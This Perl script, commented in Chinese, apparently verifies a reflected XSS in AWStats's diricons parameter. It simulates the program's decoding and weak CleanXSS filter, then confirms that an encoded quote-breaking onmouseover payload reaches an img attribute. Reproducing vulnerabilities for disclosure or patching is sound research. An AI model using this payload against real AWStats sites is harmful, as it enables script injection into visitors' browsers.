#!/usr/bin/perl
# R5-2: AWStats diricons 反射 XSS — 复现 noise 簇验证的精确代码路径
use strict; use warnings;

# --- 模拟 awstats.pl 的参数捕获与清理链 (行号对应 8.0 develop) ---
# L17603: DecodeEncodedString (CGI 模式对 %XX 解码)
sub DecodeEncodedString { my $s = shift; $s =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg; return $s; }
# L17622: $DirIcons 从 query 捕获 (Sanitize 前)
sub CleanXSS {  # L8169: 仅剥离 < > | 和字面 onload
    my $s = shift; $s =~ s/[<>|]//g; $s =~ s/onload//gi; return $s;
}
# L8029: XMLEncode 在默认 html 模式是空操作
sub XMLEncode { return shift; }

my $query = 'diricons=%22%20onmouseover%3D%22alert(document.domain)%2F%2F';
my ($DirIcons) = ($query =~ /diricons=([^&]+)/i);
$DirIcons = DecodeEncodedString($DirIcons);
# 实际路径: DirIcons 经 CleanXSS (无引号剥离), 然后进 img src (L8303 模式)
$DirIcons = CleanXSS($DirIcons);
my $img = '<img src="' . XMLEncode($DirIcons) . '/other/awstats_logo.png" border="0">';
print "DirIcons after CleanXSS: [$DirIcons]\n";
print "rendered img tag: $img\n";
if ($img =~ /onmouseover="alert\(document\.domain\)\/\/\/other\/awstats_logo/) {
    print "VERDICT: XSS payload SURVIVES into img attribute — REACHABLE\n";
} else {
    print "VERDICT: payload blocked\n";
}
